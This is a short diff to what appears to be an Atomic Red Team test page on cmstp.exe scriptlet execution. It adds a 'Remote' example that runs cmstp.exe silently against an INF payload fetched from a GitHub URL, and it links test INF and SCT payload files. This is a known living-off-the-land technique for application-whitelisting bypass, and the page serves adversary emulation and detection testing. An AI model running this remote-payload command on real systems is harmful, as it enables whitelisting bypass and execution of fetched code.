@@ -5,9 +5,16 @@
 
 ## Scriptlet execution
 
+### Local
+
     cmstp.exe /s CMSTP.inf
+
+### Remote:
+
+    cmstp.exe /ni /s https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/CMSTP.inf
 
 ## Test Script
 
 [CMSTP.INF](https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/CMSTP.inf)
+
 [CMSTP.SCT](https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/CMSTP.sct)
